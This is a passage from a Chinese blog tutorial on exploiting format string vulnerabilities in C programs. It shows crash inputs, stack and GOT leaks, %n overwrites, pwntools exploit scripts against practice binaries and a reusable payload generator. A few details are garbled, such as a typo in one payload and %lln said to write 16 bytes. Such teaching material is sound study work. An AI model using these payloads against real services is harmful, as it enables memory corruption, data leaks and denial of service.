title="程序崩溃"></a>程序崩溃</h3><p>利用格式化字符串让程序崩溃很简单，只需要向程序输入无数个%s。对于每一个%s，程序都要获取一个栈上的数字，并把该数字视作一个地址，然后打印出地址指向的内存内容，直到出现NULL字符。但是栈上并不是每一个值都对应着一个合法的地址，总会有一个对应的内存不存在，就可以让程序崩溃。</p><p>比如：<code>printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)</code></p><p>利用这一漏洞，我们虽然不能控制程序，但是可以让服务崩溃，使得其他用户无法访问。</p><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>我们可以利用程序崩溃来验证漏洞，除此之外我们还是要利用格式化字符串获取有效信息，为下一步的漏洞利用做准备。</p><p>我们已经知道格式化字符串函数从栈上取值，并且在x86中参数逆序（从右到左）进栈，而对于printf函数来说，实际参数也按照逆序的顺序被压入栈中，所以参数在内存中出现的顺序和printf调用时的顺序一样。</p><h5 id="泄露栈变量数值"><a href="#泄露栈变量数值" class="headerlink" title="泄露栈变量数值"></a>泄露栈变量数值</h5><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;%p %p %p\n&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);  <span class="hljs-comment">//输出三个整型变量，接着输出字符串 str</span><br>    <span class="hljs-built_in">printf</span>(str);  <span class="hljs-comment">//直接将 str 字符串作为格式化字符串</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出是这个样子的</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/use1.png"></p><p>可以看到第二个print处输出了两个地址，分别看一下两个printf的栈结构</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack-2.png"></p><p>可以看到，我们利用自己写的格式化字符串能够查看栈上的信息。</p><p>像例题这样的格式化字符串函数写法，我们只能按顺序获取栈上的参数。我们可以稍加修改，根据前面讲到的格式化字符串的格式，我们可以通过<code>%n$[type]</code>的方式查看第n个参数的值</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">200</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);<br>    <span class="hljs-built_in">printf</span>(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在开始输入%3$x，查看第二个printf处的栈结构</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-stack.png"></p><p>查看输出结果，printf输出了第3+1个参数对应的值</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-output.png"></p><h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>还是用上面的那个程序，这次输入<code>$s</code>来试一下</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>在第二次 printf 处，程序将 0xffffcfe4 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p><p>需要注意的是，并不是所有这样的都会正常运行，<strong>如果对应的变量不能够被解析为字符串地址，程序就会直接崩溃</strong>。</p><p>我们尝试输入 <code>%4$s</code>，就会报错直接崩溃。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-error.png"></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><ul><li><p>可以利用 <code>%x</code> 或者 <code>%p</code> 来获取相应栈上的内存，区别是输出的信息是否包含前缀”0x”（ <code>%p</code> 会自动添加前缀”0x”，而 <code>%x</code> 不会）</p></li><li><p>利用 <code>%s</code> 来获取变量所对应地址的内容，但需要注意字符串以零字符（’\0’）作为结尾。该地址上存储的数据可能会被截断，只会输出到遇到第一个零字符为止。</p></li><li><p>利用 <code>% [n]$x</code> 来获取指定参数的值，利用 <code>%[n]$s</code> 来获取指定参数对应地址内容。</p></li></ul><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>我们在做题的时候经常会需要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这个时候我们就需要控制泄露某一个地址的内存。</p><p>一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的。也就是说，调用输出函数的时候我们的<strong>第一个参数值就是这个格式化字符串的地址</strong>。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>在我们上面输出字符串的例子中，我们可以看出栈上的第二个变量就是我们的格式化字符串地址 0xffffcFE0，同时该地址存储的也是 “%s” 格式化字符串内容。</p><p>那如果我们知道某个格式化字符串在输出的时候调用的是第几个参数，我们就可以通过下面的方法获取某个指定地址的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[addr]%[k]$s<br></code></pre></td></tr></table></figure><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>那么如何确定该格式化字符串是第几个参数呢？我们可以向程序发送如下格式的payload：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[tag]%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br></code></pre></td></tr></table></figure><p>其中 <code>[tag]</code> 是我们判断的标志，我们一般会选择重复某一个字符的机器字长作为 tag ，比如 ‘AAAA’。如果输出的栈上的内容和我们的 tag 重复了，那么这个地址大概率就是格式化字符串的地址，可以更换多个 tag 再次确认尝试。</p><p>还是之前的程序，我们输入<code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</code>来测试一下</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output.png"></p><p>其中第二次 printf 输出如下（为了方便看，我在每两个地址之间加了空格）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span> <span class="hljs-number">0</span>xffffcffc <span class="hljs-number">0</span>xf7de0012 <span class="hljs-number">0</span>x80484a0 <span class="hljs-number">0</span>xf63d4e2e <span class="hljs-number">0</span>x804825c <span class="hljs-number">0</span>x7b1ea71 <span class="hljs-number">0</span>x41414141 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025<br></code></pre></td></tr></table></figure><p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第8个参数，是格式化字符串的第7个参数。我们可以来测试一下，再一次输入 <code>%7$p</code>即可读出这里的内容。如果这是个不合法的地址，程序将会崩溃。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output2.png"></p><p>当然会这个也没有什么用（x</p><h5 id="确定利用的函数"><a href="#确定利用的函数" class="headerlink" title="确定利用的函数"></a>确定利用的函数</h5><p>就像前面说的，我们真正经常用到是把程序中某函数的 GOT 地址传进去，然后获得该地址所对应的函数的虚拟地址，最后根据函数在 libc 中的相对位置，计算出我们需要的函数地址。</p><p>还是用上面的例子，我们输入一个可访问的地址，比如<code>scanf@got</code>，就应该输出scanf对应的地址。</p><p>我们首先使用 <code>read -r test</code> 命令查看其重定向表：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/got.png"></p><blockquote><p>这里之所以没有使用 printf 函数，是因为 scanf 函数会过滤掉一些字符，就像 ‘\x0c’ (‘\f’) 、’’\x07’ (\a’) 、’\x08’ (’\b’) 、’\x20’ (SPACE)等的不可见字符都会被省略。</p></blockquote><p>直接用pwntools写个exp，把获取got表地址写在里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./test&quot;</span>)<br><br>scanf_got = elf.got[<span class="hljs-string">&#x27;scanf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(scanf_got))    <br><br>payload=p32(scanf_got)+<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>gdb.attach(p,<span class="hljs-string">&quot;break printf&quot;</span>)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(p.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>最终的输出和gdb栈结构如下，可以看到我们打印输出的确实是scanf的地址</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/exp.png"></p><h5 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h5><ul><li>首先确定要泄露的参数的相对偏移</li><li>确定要利用的函数</li><li>进行泄露</li></ul><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>在格式化字符串的多种类型中，有一个神秘的 <code>%n</code>······（x </p><p><strong><code>%n</code> 不输出字符，但是把已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。</strong></p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;Hello Modifier&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;num);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输出为</span><br>Hello Modifier<br><span class="hljs-number">15</span>    <span class="hljs-comment">//&#x27;Hello Modifier&#x27;+&quot;%s %n&quot;中间的空格 = 15</span><br></code></pre></td></tr></table></figure><p>通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数（快去复习一下格式化字符串的格式）。</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%010u%n\n&quot;</span>, <span class="hljs-number">1</span>, &amp;num);  <span class="hljs-comment">//%010u 输出域宽为10的十进制整型数字，不足的位数在左侧用0补齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num is %d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输出为</span><br><span class="hljs-number">0000000001</span><br>num is <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>同理我们可以将一个十六进制的地址进行适当的转换，利用格式化字符串写入内存。</p><p>需要注意的是，我们不能直接转换为一个占位很大的十进制进行编写，如果占位符的长度超出了<code>int</code>类型的范围，这将导致未定义的行为。也就是说这个覆盖不一定会成功，成功与否取决于不同的编译器和不同的平台。</p><p>接下来都用下面的程序进行相应的学习：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><span class="hljs-type">int</span> a=<span class="hljs-number">123</span>,b=<span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> c=<span class="hljs-number">789</span>;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;c);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,s);<br>    <span class="hljs-built_in">printf</span>(s);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>     &#125; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) <br>    &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <br>&#125;<br></code></pre></td></tr></table></figure><p>无论覆盖什么地址的变量，我们都是构造类似如下的payload:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[padding][overwrite addr]%[overwrite offset]$n<br></code></pre></td></tr></table></figure><p>payload需要写的数据也就是我们要覆盖内存的步骤：</p><ul><li>确定覆盖的地址</li><li>确定要覆盖的变量的相对偏移</li><li>进行覆盖</li></ul><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>在这里我们设计程序直接输出了栈变量C的地址。在实际运用中，我们可以利用其它方法获取相应地址。</p><h5 id="确定相对偏移-1"><a href="#确定相对偏移-1" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>利用上面讲过的简单粗暴的方法进行操作，确定是格式化字符串的第6个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">$ ./overflow<br><span class="hljs-number">0xff8f615c</span><br>AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p  <span class="hljs-comment">//这里是我们的输入</span><br>AAAA,<span class="hljs-number">0xff8f60f8</span>,<span class="hljs-number">0xf7f84410</span>,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x1</span>,<span class="hljs-number">0x41414141</span>(在这里！),<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span>,<span class="hljs-number">0x2c70252c</span>,<span class="hljs-number">0x252c7025</span>,<span class="hljs-number">0x70252c70</span><br></code></pre></td></tr></table></figure><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>我们已知第六个参数值就是存储变量 c 的地址后，便可以利用%n的特征来修改 c 的值啦！</p><p>根据上面说过的，我们目标输出 <code>modified c.</code>，需要把 c 改为16，则payload 为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[address of c]%012%<span class="hljs-number">6</span>$n  <br></code></pre></td></tr></table></figure><p>最终的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_c=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr_c)<br><br>payload=p32(addr_c)+<span class="hljs-string">b&#x27;%012d&#x27;</span>+<span class="hljs-string">b&#x27;%6$n&#x27;</span>  <br><span class="hljs-comment">#[address of c]%012%6$n   addr of c 的长度为 4，故而我们得再输入12个字符才可以达到16个字符</span><br><span class="hljs-built_in">print</span> payload<br><span class="hljs-comment">#gdb.attach(p,&quot;break printf&quot;)</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后运行结果</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show.png"></p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>按照我们上面讲过的payload大致格式，需要在输入内容之前前缀将要覆盖的地址，这个地址将会占用机器字长个字节，也就是说我们能覆盖的最小值就是4字节或者8字节，当我们想要修改变data变量为小于机器字长的数值时该怎么办呢？</p><p>我们可以不把变量的地址放在格式化字符串的前面。我们当时寻找偏移把 tag 放在字符串的最前面是因为这样比较方便直观，如果我们把 tag 放在中间，其实也不影响，如下，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">%p,%p,AAAA,%p,%p,%p,%p,%p,%p        <br><span class="hljs-number">0xffe2c948</span>,<span class="hljs-number">0xf7fa1410</span>,AAAA,<span class="hljs-number">0x80484bd</span>,(nil),<span class="hljs-number">0x10</span>,x70257025,<span class="hljs-number">0x41414141</span>,<span class="hljs-number">0x70257025</span><br></code></pre></td></tr></table></figure><p> 同样，我们可以把希望覆盖的的地址写在后面，对应的我们要将%n的参数进行相应的修改。同时我们想要将a覆盖成2，就可以写成下面的形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">aa%k$n[padding][addr of a]  <span class="hljs-comment">//padding 用来填充对齐机器字节</span><br></code></pre></td></tr></table></figure><p>最后的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./overflow&#x27;</span>)<br>addr_a=<span class="hljs-number">0x0804A024</span><br><br>payload=<span class="hljs-string">b&#x27;aa%8$naa&#x27;</span>+p32(addr_a)  <span class="hljs-comment">#b&#x27;aa%8$naa&#x27;占8字节也就是两个变量的长度，所以地址相应后推两位就是放在第8个变量的位置</span><br>p.sendline(payload)<br><br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>对应的结果是：<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/overflow-show2.png"></p><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>在前面说过，如果一次性输出大数字个字节来进行覆盖，那么结果成功与否是我们不可控的，我们就需要用别的方式进行覆盖。我们需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数。利用方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> c;<br><span class="hljs-type">short</span> s;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">long</span> l;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hhn\n&quot;</span>, str, &amp;c);       <span class="hljs-comment">// 写入单字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %hn\n&quot;</span>, str, &amp;s);        <span class="hljs-comment">// 写入双字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;i);         <span class="hljs-comment">// 写入4字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %ln\n&quot;</span>, str, &amp;l);        <span class="hljs-comment">// 写入8字节</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %lln\n&quot;</span>, str, &amp;ll);      <span class="hljs-comment">// 写入16字节</span><br></code></pre></td></tr></table></figure><p>我们都知道<strong>在x86中和 x64 的体系结构中，变量以小端序存储</strong>。像题目中所要求的，我们需要将b覆盖为0x12345678，这个<code>0x12345678</code> 在内存中地址从低到高就是 <code>\x78\x56\x34\x12</code>。同时我们利用ida得知b的地址是 0x0804A028。那么我们希望覆盖的方式就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure><p>同理payload也要构造为分别赋值的形式，大致如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p32(<span class="hljs-number">0x0804A028</span>)+p32(<span class="hljs-number">0x0804A029</span>)+p32(<span class="hljs-number">0x0804A02a</span>)+p32(<span class="hljs-number">0x0804A02b</span>)+pad1+<span class="hljs-string">&#x27;%6$n&#x27;</span>+pad2+<span class="hljs-string">&#x27;%7$n&#x27;</span>+pad3+<span class="hljs-string">&#x27;%8$n&#x27;</span>+pad4+<span class="hljs-string">&#x27;%9$n&#x27;</span><br></code></pre></td></tr></table></figure><p>可以靠自己的努力一一计算，也可以使用下方现成的基本构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">prev, word, index</span>):<br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><p>只需在main函数中调用fmt_str()函数，填充相应变量即可。</p><p>其中每个参数的含义基本如下：</p><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 